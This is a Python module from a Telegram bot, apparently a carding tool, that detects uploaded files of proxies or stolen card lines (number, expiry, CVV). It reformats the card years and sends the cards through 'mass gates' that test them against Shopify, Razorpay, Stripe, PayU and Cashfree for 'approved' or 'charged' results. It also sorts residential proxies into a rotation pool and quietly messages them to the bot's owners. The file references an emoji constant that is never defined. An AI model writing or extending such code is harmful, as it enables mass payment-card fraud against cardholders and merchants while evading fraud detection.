"""file_flow.py — auto-detect dropped files (proxy vs CC) and route them.

Proxy file  -> selection: Global pool (razorpay reads rz_pxy.txt directly).
CC file     -> cook (year format) -> mass gates -> gate runs its own
               charged-only / approved+charged selection window.
Manual /msh /mrz etc. commands keep working unchanged.
"""
import asyncio
import os
import re
import logging
from aiogram import types, F, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

from mass_gates._tg_helpers import safe_reply
from proxy import parse_proxy_input, check_proxy_live
from mass_gates.msh import extract_cards_from_text, luhn_check

router = Router()

RZ_API = os.environ.get("RZ_API", "http://127.0.0.1:9000")
MAX_FILE = 8 * 1024 * 1024  # 8MB

ID_APPROVED = "6044254523009012231"
ID_DECLINED = "5893081007153746175"
ID_CHARGED = "5359719332542718652"
ID_WARNING = "6255910249362885846"
ID_STAR = "6136275172283391020"
ID_GATEWAY = "5085022089103016925"
ID_LOCK = "5258419835922030550"
ID_TOP = "5463071033256848094"
ID_STOP = "5247149163132493357"
ID_WALLET = "5424976816530014958"
# MinecraftEnchanted custom emoji IDs (unique per mass gate)
EMOJI_MC_DIAMOND  = "5323344825016166715"   # 💎
EMOJI_MC_HAMMER   = "5323558611308295365"   # 🔨
EMOJI_MC_LOG      = "5323406835753984609"   # 🪵
EMOJI_MC_COMPASS  = "5323308163175327669"   # 🧭
EMOJI_MC_HELMET   = "5323508935716549367"   # 🪖
EMOJI_MC_TARGET   = "5323410860138343577"   # 🎯
EMOJI_MC_PICKAXE  = "5323815076690440002"   # ⛏️

def _tg(eid, fb):
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'

def _btn(text, data, style="primary", emoji=None):
    kw = {"text": text, "callback_data": data, "style": style}
    if emoji:
        kw["icon_custom_emoji_id"] = emoji
    return InlineKeyboardButton(**kw)

_STATE = {}  # user_id -> dict

GATES = {
    "msh": ("𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀", "/msh", EMOJI_MC_DIAMOND),
    "mrz": ("𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 𝗠𝗮𝘀𝘀", "/mrz", EMOJI_MC_HAMMER),
    "mst": ("𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀", "/mst", EMOJI_MC_LOG),
    "mauth": ("𝗔𝘂𝘁𝗵 𝗠𝗮𝘀𝘀", "/mauth", EMOJI_MC_COMPASS),
    "mchk": ("𝗖𝗵𝗸 𝗠𝗮𝘀𝘀", "/mchk", EMOJI_MC_HELMET),
    "mstripe": ("𝗦𝘁𝗿𝗶𝗽𝗲 𝟮 𝗠𝗮𝘀𝘀", "/mstripe", EMOJI_MC_TARGET),
    "mpu": ("𝗣𝗮𝘆𝗨 𝗠𝗮𝘀𝘀", "/mpu", EMOJI_MC_PICKAXE),
    "mcf": ("𝗖𝗮𝘀𝗵𝗳𝗿𝗲𝗲 𝗠𝗮𝘀𝘀", "/mcf", EMOJI_MC_AXE),
}


def _detect_year_format(content: str) -> str:
    """'yy' (all 2-digit years), 'yyyy' (all 4-digit), or 'mixed'."""
    yrs = []
    cc_re = re.compile(r'\d{13,19}\s*[|/:=\s]\s*\d{1,2}\s*[|/:]\s*(\d{2,4})\s*[|/:]\s*\d{3,4}')
    for line in content.splitlines():
        m = cc_re.search(line.strip())
        if m:
            yrs.append(len(m.group(1)))
    if not yrs:
        return "yy"
    if all(x == 2 for x in yrs):
        return "yy"
    if all(x == 4 for x in yrs):
        return "yyyy"
    return "mixed"


def _detect_type(text: str) -> str:
    lines = [l.strip() for l in text.splitlines() if l.strip() and not l.strip().startswith("#")]
    if not lines:
        return "none"
    proxy = 0
    cc = 0
    cc_re = re.compile(r'^\d{13,19}\s*[|/:=\s]\s*\d{1,2}\s*[|/:]\s*\d{2,4}\s*[|/:]\s*\d{3,4}')
    for ln in lines[:500]:
        if parse_proxy_input(ln):
            proxy += 1
        if cc_re.match(ln):
            cc += 1
    if proxy > 0 and proxy >= cc:
        return "proxy"
    if cc > 0 and cc > proxy:
        return "cc"
    return "none"


@router.message(F.document)
async def on_file(message: types.Message):
    # skip command captions — /msh etc. handle their own files
    cap = (message.caption or "").strip()
    if cap.startswith("/"):
        return
    doc = message.document
    if not doc:
        return
    if doc.file_size and doc.file_size > MAX_FILE:
        await safe_reply(message, f'{_tg(ID_DECLINED, "❌")} 𝗙𝗶𝗹𝗲 𝘁𝗼𝗼 𝗹𝗮𝗿𝗴𝗲 (𝗺𝗮𝘅 𝟴𝗠𝗕).', parse_mode="HTML")
        return
    try:
        fi = await message.bot.get_file(doc.file_id)
        data = await message.bot.download_file(fi.file_path)
        content = data.read().decode("utf-8", errors="ignore") if hasattr(data, "read") else str(data)
    except Exception as e:
        logging.error(f"[file_flow] read: {e}")
        await safe_reply(message, f'{_tg(ID_DECLINED, "❌")} 𝗘𝗿𝗿𝗼𝗿 𝗿𝗲𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲.', parse_mode="HTML")
        return
    if not content.strip():
        await safe_reply(message, f'{_tg(ID_WARNING, "⚠️")} 𝗘𝗺𝗽𝘁𝘆 𝗳𝗶𝗹𝗲.', parse_mode="HTML")
        return

    typ = _detect_type(content)
    uid = message.from_user.id

    if typ == "proxy":
        _STATE[uid] = {"type": "proxy", "raw": content}
        text = (
            f'{_tg(ID_WALLET, "👛")} <b>𝗣𝗥𝗢𝗫𝗬 𝗙𝗜𝗟𝗘 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗</b>\n'
            f"━━━━━━━━━━━━━━━━\n"
            f'{_tg(ID_CHARGED, "💎")} 𝗪𝗵𝗲𝗿𝗲 𝘁𝗼 𝗮𝗱𝗱 𝘁𝗵𝗲𝗺?\n\n'
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [
                _btn("𝗔𝗱𝗱 𝘁𝗼 𝗚𝗹𝗼𝗯𝗮𝗹 𝗽𝗼𝗼𝗹", "ff_global", "success", ID_APPROVED),
            ],
            [
                _btn("🔍 𝗖𝗹𝗮𝘀𝘀𝗶𝗳𝘆 + 𝗥𝗭 (𝗿𝗲𝘀𝗶𝗱𝗲𝗻𝘁𝗶𝗮𝗹)", "ff_classify_rz", "primary", ID_CHARGED),
            ],
            [_btn("𝗖𝗮𝗻𝗰𝗲𝗹", "ff_cancel", "danger", ID_STOP)],
        ])
        await message.answer(text, parse_mode="HTML", reply_markup=kb)
        return

    if typ == "cc":
        cards = extract_cards_from_text(content)
        if not cards:
            await safe_reply(message, f'{_tg(ID_WARNING, "⚠️")} 𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗳𝗶𝗹𝗲.', parse_mode="HTML")
            return
        year_fmt = _detect_year_format(content)
        # mixed YY/YYYY -> no cook question, process straight through
        if year_fmt == "mixed":
            _STATE[uid] = {"type": "cc", "cards": cards, "cook": "yy"}
            await _show_gates(message, _STATE[uid], edit=False)
            return
        _STATE[uid] = {"type": "cc", "cards": cards, "cook": year_fmt}
        text = (
            f'{_tg(ID_CHARGED, "💎")} <b>𝗖𝗖 𝗙𝗜𝗟𝗘 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗</b>\n'
            f"━━━━━━━━━━━━━━━━\n"
            f'{_tg(ID_STAR, "⭐")} 𝗖𝗮𝗿𝗱𝘀 ➠ <code>{len(cards)}</code>\n'
            f'{_tg(ID_GATEWAY, "⚡")} 𝗬𝗲𝗮𝗿 ➠ <b>{year_fmt.upper()}</b> (auto)\n\n'
            f'𝗖𝗼𝗼𝗸 𝘁𝗵𝗲 𝗰𝗮𝗿𝗱𝘀 𝗼𝗿 𝗰𝗮𝗻𝗰𝗲𝗹?'
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [
                _btn("𝗖𝗼𝗼𝗸", "ff_cook", "success", ID_APPROVED),
                _btn("𝗖𝗮𝗻𝗰𝗲𝗹", "ff_cancel", "danger", ID_STOP),
            ],
        ])
        await message.answer(text, parse_mode="HTML", reply_markup=kb)
        return

    await safe_reply(message, f'{_tg(ID_WARNING, "⚠️")} 𝗖𝗼𝘂𝗹𝗱 𝗻𝗼𝘁 𝗱𝗲𝘁𝗲𝗰𝘁 𝗽𝗿𝗼𝘅𝘆 𝗼𝗿 𝗖𝗖 𝗶𝗻 𝘁𝗵𝗶𝘀 𝗳𝗶𝗹𝗲.', parse_mode="HTML")


@router.callback_query(F.data.startswith("ff_"))
async def ff_cb(callback: types.CallbackQuery):
    uid = callback.from_user.id
    data = callback.data
    st = _STATE.get(uid)

    if data == "ff_cancel":
        _STATE.pop(uid, None)
        try:
            await callback.message.edit_text(f'{_tg(ID_DECLINED, "❌")} 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.', parse_mode="HTML")
        except Exception:
            pass
        await callback.answer()
        return

    if not st:
        await callback.answer("𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗲𝘅𝗽𝗶𝗿𝗲𝗱.", show_alert=True)
        return

    if data == "ff_global":
        await _add_global(callback, st)
    elif data == "ff_classify_rz":
        await _classify_and_add_rz(callback, st)
    elif data == "ff_cook":
        await _show_gates(callback.message, st, edit=True)
    elif data.startswith("ff_gate_"):
        gate = data.split("_", 2)[2]
        await _run_gate(callback, st, gate)
    await callback.answer()


async def _add_global(callback, st):
    from proxy import process_proxies_background
    raw = st.get("raw", "")
    valid = []
    for ln in raw.splitlines():
        ln = ln.strip()
        if not ln or ln.startswith("#"):
            continue
        p = parse_proxy_input(ln)
        if p:
            valid.append(p)
    if not valid:
        await callback.message.edit_text(f'{_tg(ID_DECLINED, "❌")} 𝗡𝗼 𝘃𝗮𝗹𝗶𝗱 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗶𝗻 𝘁𝗵𝗲 𝗳𝗶𝗹𝗲.', parse_mode="HTML")
        _STATE.pop(callback.from_user.id, None)
        return
    await callback.message.edit_text(f'{_tg(ID_GATEWAY, "⚡")} 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(valid)} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗮𝗻𝗱 𝗮𝗱𝗱𝗶𝗻𝗴 𝘁𝗼 𝗚𝗹𝗼𝗯𝗮𝗹 𝗽𝗼𝗼𝗹...', parse_mode="HTML")
    _STATE.pop(callback.from_user.id, None)
    # Pass a fake message with the REAL user (callback.message.from_user is the bot,
    # since the bot sent that message) so proxies save under the correct user_id.
    fake = _FakeMsg(callback.bot, callback.from_user, callback.message.chat.id)
    asyncio.create_task(process_proxies_background(callback.bot, fake, valid, "𝗙𝗶𝗹𝗲 𝗱𝗿𝗼𝗽"))



async def _classify_and_add_rz(callback, st):
    """Classify proxies; residential/rotating -> rz_pxy.txt + silent dev DM."""
    import proxy_classify
    raw = st.get("raw", "")
    proxies = []
    for ln in raw.splitlines():
        ln = ln.strip()
        if not ln or ln.startswith("#"):
            continue
        p = parse_proxy_input(ln)
        if p:
            proxies.append(p.get("http_format") or ln)
    if not proxies:
        await callback.message.edit_text(f'{_tg(ID_DECLINED, "❌")} 𝗡𝗼 𝘃𝗮𝗹𝗶𝗱 𝗽𝗿𝗼𝘅𝗶𝗲𝘀.', parse_mode="HTML")
        _STATE.pop(callback.from_user.id, None)
        return
    await callback.message.edit_text(f'{_tg(ID_GATEWAY, "⚡")} 𝗖𝗹𝗮𝘀𝘀𝗶𝗳𝘆𝗶𝗻𝗴 {len(proxies)} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 (𝗿𝗲𝘀𝗶𝗱𝗲𝗻𝘁𝗶𝗮𝗹 / 𝗱𝗮𝘁𝗮𝗰𝗲𝗻𝘁𝗲𝗿 / 𝗿𝗼𝘁𝗮𝘁𝗶𝗻𝗴)...', parse_mode="HTML")
    _STATE.pop(callback.from_user.id, None)
    try:
        results = await proxy_classify.classify_proxies(proxies)
    except Exception as e:
        await callback.message.edit_text(f'{_tg(ID_DECLINED, "❌")} 𝗖𝗹𝗮𝘀𝘀𝗶𝗳𝘆 𝗲𝗿𝗿𝗼𝗿: {str(e)[:80]}', parse_mode="HTML")
        return
    residential = [p for p in proxies if proxy_classify.is_residential(results[p])]
    rotating = [p for p in residential if results[p].get("rotating")]
    static = [p for p in residential if not results[p].get("rotating")]
    datacenter = [p for p in proxies if results[p]["type"] == "datacenter"]
    dead = [p for p in proxies if results[p]["type"] == "dead"]

    # add residential (rotating first) to rz_pxy.txt, deduped
    if residential:
        _append_to_rz_pxy([p for p in (rotating + static)])

    # silent DM to the dev
    if residential:
        await _notify_dev_residential(callback.bot, residential, results)

    text = (
        f'{_tg(ID_APPROVED, "✅")} <b>𝗖𝗟𝗔𝗦𝗦𝗜𝗙𝗜𝗘𝗗</b>\n'
        f"━━━━━━━━━━━━━━━━\n"
        f'{_tg(ID_CHARGED, "💎")} 𝗥𝗲𝘀𝗶𝗱𝗲𝗻𝘁𝗶𝗮𝗹 ➠ <b>{len(residential)}</b> (🔁 {len(rotating)} rotating · {len(static)} static)\n'
        f'{_tg(ID_DECLINED, "❌")} 𝗗𝗮𝘁𝗮𝗰𝗲𝗻𝘁𝗲𝗿 ➠ <b>{len(datacenter)}</b>\n'
        f'{_tg(ID_STOP, "⛔")} 𝗗𝗲𝗮𝗱 ➠ <b>{len(dead)}</b>\n\n'
        f"𝗥𝗲𝘀𝗶𝗱𝗲𝗻𝘁𝗶𝗮𝗹 𝗼𝗻𝗲𝘀 𝘄𝗲𝗿𝗲 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 <code>rz_pxy.txt</code>."
    )
    await callback.message.edit_text(text, parse_mode="HTML")
    await callback.answer()


def _append_to_rz_pxy(proxies):
    import rz_rotation
    try:
        existing = {l.strip() for l in open(rz_rotation.RZ_PROXY_FILE) if l.strip()}
    except Exception:
        existing = set()
    to_add = [p for p in proxies if p not in existing]
    if not to_add:
        return
    with open(rz_rotation.RZ_PROXY_FILE, "a") as f:
        f.write("\n".join(to_add) + "\n")


async def _notify_dev_residential(bot, proxies, results):
    from database import OWNER_IDS
    import proxy_classify
    lines = [f"{_tg(ID_CHARGED, '💎')} <b>𝗥𝗘𝗦𝗜𝗗𝗘𝗡𝗧𝗜𝗔𝗟 𝗣𝗥𝗢𝗫𝗜𝗘𝗦 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗</b>"]
    for p in proxies[:25]:
        info = results[p]
        lines.append(f"• <code>{p}</code>\n   ➠ {proxy_classify.summarize(info)}")
    for dev in OWNER_IDS:
        try:
            await bot.send_message(chat_id=dev, text="\n".join(lines), parse_mode="HTML")
        except Exception:
            pass


async def _show_gates(msg, st, edit=False):
    cards = st.get("cards", [])
    cook = st.get("cook", "yy")
    rows = []
    for key, (label, cmd, emoji) in GATES.items():
        rows.append([_btn(label, f"ff_gate_{key}", "primary", emoji)])
    rows.append([_btn("𝗖𝗮𝗻𝗰𝗲𝗹", "ff_cancel", "danger", ID_STOP)])
    kb = InlineKeyboardMarkup(inline_keyboard=rows)
    text = (
        f'{_tg(ID_CHARGED, "💎")} <b>𝗖𝗛𝗢𝗢𝗦𝗘 𝗠𝗔𝗦𝗦 𝗚𝗔𝗧𝗘</b>\n'
        f"━━━━━━━━━━━━━━━━\n"
        f'{_tg(ID_STAR, "⭐")} 𝗖𝗮𝗿𝗱𝘀 ➠ <code>{len(cards)}</code>\n'
        f'{_tg(ID_GATEWAY, "⚡")} 𝗬𝗲𝗮𝗿 ➠ <b>{cook.upper()}</b>\n\n'
        f"𝗣𝗶𝗰𝗸 𝘁𝗵𝗲 𝗴𝗮𝘁𝗲 — 𝗶𝘁 𝘄𝗶𝗹𝗹 𝗮𝘀𝗸 𝗰𝗵𝗮𝗿𝗴𝗲𝗱-𝗼𝗻𝗹𝘆 𝗼𝗿 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱+𝗰𝗵𝗮𝗿𝗴𝗲𝗱."
    )
    if edit:
        try:
            await msg.edit_text(text, parse_mode="HTML", reply_markup=kb)
        except Exception:
            await msg.answer(text, parse_mode="HTML", reply_markup=kb)
    else:
        await msg.answer(text, parse_mode="HTML", reply_markup=kb)


async def _run_gate(callback, st, gate):
    cards = st.get("cards", [])
    cook = st.get("cook", "yy")
    _STATE.pop(callback.from_user.id, None)
    from mass_gates.msh import msh_command
    from mass_gates.mrz import mrz_command
    from mass_gates.mst import mst_command
    from mass_gates.mauth import mauth_command
    from mass_gates.mchk import mchk_command
    from mass_gates.mstripe import mstripe_command
    from mass_gates.mpu import mpu_command
    from mass_gates.mcf import mcf_command
    handlers = {
        "msh": msh_command,
        "mrz": mrz_command,
        "mst": mst_command,
        "mauth": mauth_command,
        "mchk": mchk_command,
        "mstripe": mstripe_command,
        "mpu": mpu_command,
        "mcf": mcf_command,
    }
    h = handlers.get(gate)
    if not h:
        await callback.answer("𝗨𝗻𝗸𝗻𝗼𝘄𝗻 𝗴𝗮𝘁𝗲.", show_alert=True)
        return

    # normalize cards to the chosen year format
    out = []
    for c in cards:
        p = c.split("|")
        if len(p) != 4:
            continue
        cc, mm, yy, cvv = p
        if cook == "yyyy" and len(yy) == 2:
            yy = "20" + yy
        elif cook == "yy" and len(yy) == 4:
            yy = yy[2:]
        out.append(f"{cc}|{mm}|{yy}|{cvv}")
    cards_text = "\n".join(out)

    await callback.message.edit_text(f'{_tg(ID_GATEWAY, "⚡")} 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 {GATES[gate][0]}...', parse_mode="HTML")

    fake = _FakeMsg(callback.bot, callback.from_user, callback.message.chat.id)
    fake.text = f"/{gate} {cards_text}"
    await h(fake)


class _FakeMsg:
    def __init__(self, bot, user, chat_id):
        self.bot = bot
        self.from_user = user
        self.chat = types.Chat(id=chat_id, type="private")
        self.chat_id = chat_id
        self.text = ""
        self.caption = None
        self.document = None
        self.reply_to_message = None
        self.message_id = 0

    async def reply(self, *a, **kw):
        kw.pop("reply_to_message_id", None)
        return await self.bot.send_message(self.chat_id, *a, **kw)

    async def answer(self, *a, **kw):
        kw.pop("reply_to_message_id", None)
        return await self.bot.send_message(self.chat_id, *a, **kw)

    async def reply_document(self, *a, **kw):
        kw.pop("reply_to_message_id", None)
        return await self.bot.send_document(self.chat_id, *a, **kw)

    async def answer_photo(self, *a, **kw):
        return await self.bot.send_photo(self.chat_id, *a, **kw)

    async def edit_text(self, *a, **kw):
        return None
